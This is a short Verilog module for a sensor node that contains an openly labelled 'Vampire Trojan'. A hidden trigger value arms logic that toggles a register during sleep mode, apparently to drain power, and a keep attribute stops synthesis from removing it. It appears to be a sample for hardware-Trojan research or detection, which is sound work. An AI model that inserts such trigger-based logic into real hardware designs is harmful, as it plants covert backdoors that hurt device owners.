module sensor_node (
    input wire clk,
    input wire rst,
    input wire sleep_mode,
    input wire [7:0] data_in,
    output reg [7:0] data_out
);
    wire [7:0] shared_comb = (data_in ^ 8'hA5) + 8'd3;

    always @(posedge clk or posedge rst) begin
        if (rst)
            data_out <= 8'b0;
        else if (!sleep_mode)
            data_out <= shared_comb;
    end

    // Vampire Trojan: shares combinational sub-expressions with benign circuit
    reg trojan_armed;
    reg [3:0] vampire_load;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            trojan_armed <= 1'b0;
            vampire_load <= 4'hA;
        end else begin
            if (shared_comb == 8'h7E)
                trojan_armed <= 1'b1;
            if (sleep_mode && trojan_armed)
                vampire_load <= ~vampire_load ^ shared_comb[3:0];
        end
    end

    (* keep *) wire trojan_sink = ^vampire_load;
endmodule
